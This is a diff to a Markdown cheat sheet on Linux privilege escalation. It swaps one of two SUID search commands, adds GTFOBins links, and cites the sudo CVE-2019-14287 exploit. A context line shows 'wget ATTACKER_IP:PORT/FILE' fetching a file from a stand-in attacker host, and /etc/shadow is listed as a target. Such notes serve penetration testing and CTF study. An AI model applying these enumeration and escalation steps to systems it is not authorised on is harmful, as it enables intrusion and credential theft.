@@ -57,9 +57,9 @@ wget ATTACKER_IP:PORT/FILE
 #### SUID/SGID files
 ```bash
 # List files that have SUID or SGID bits set
-find / -type f -perm -04000 -ls 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null 
 ```
+- Check [GTFOBins](https://gtfobins.org/)
 
 #### Sensitive files writable
 - `/etc/shadow`
@@ -88,6 +88,8 @@ find / -perm -u=s -type f 2>/dev/null
         # Get the commands the current user is allowed to run as sudo
         sudo -l
         ```
+        - Check [GTFOBins](https://gtfobins.org/)
+        - Check for Exclusion operators (!) [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)
 
 #### Sensitive files readable
 - `/etc/shadow`
